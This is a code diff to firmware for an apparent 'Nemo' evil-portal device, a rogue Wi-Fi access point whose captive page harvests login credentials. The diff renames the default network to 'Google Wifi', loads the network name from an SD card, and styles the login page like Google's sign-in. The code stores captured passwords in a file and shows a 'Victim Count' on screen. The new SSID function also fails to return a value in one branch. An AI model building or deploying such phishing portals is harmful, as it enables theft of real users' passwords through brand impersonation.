@@ -3,7 +3,8 @@
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-#define DEFAULT_AP_SSID_NAME "Nemo Free WiFi"
+#define DEFAULT_AP_SSID_NAME "Google Wifi"
+#define SD_SSID_NAME_PATH "/nemo-portal-ssid.txt"
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
 #if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
@@ -31,7 +32,6 @@
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = 0;
 String capturedCredentialsHtml = "";
-String apSsidName = String(DEFAULT_AP_SSID_NAME);
 
 // Init System Settings
 const byte HTTP_CODE = 200;
@@ -41,11 +41,26 @@ unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer;
 WebServer webServer(80);
 
+String getSSIDName() {
+  #if !defined(SDCARD)
+    return String(DEFAULT_AP_SSID_NAME);
+  #endif
+  File file = SD.open(SD_SSID_NAME_PATH, FILE_READ); 
+  if (file) {
+    if (file.available()) {
+      String data = file.readString();
+      return data;
+    }
+  } else {
+    return String(DEFAULT_AP_SSID_NAME);
+  }
+}
+
 void setupWiFi() {
   Serial.println("Initializing WiFi");
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(apSsidName);
+  WiFi.softAP(getSSIDName());
 }
 
 void printHomeToScreen() {
@@ -59,8 +74,8 @@ void printHomeToScreen() {
   DISP.setCursor(0, 35);
   DISP.print("WiFi IP: ");
   DISP.println(AP_GATEWAY);
-  DISP.printf("SSID: ");  //, apSsidName);
-  DISP.print(apSsidName);
+  DISP.printf("SSID: ");  //, getSSIDName());
+  DISP.print(getSSIDName());
   DISP.println("");
   DISP.printf("Victim Count: %d\n", totalCapturedCredentials);
 }
@@ -79,7 +94,7 @@ String getHtmlContents(String body) {
     "<html>"
     "<head>"
     "  <title>"
-    + apSsidName + "</title>"
+    + getSSIDName() + "</title>"
     "  <meta charset='UTF-8'>"
     "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
     "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
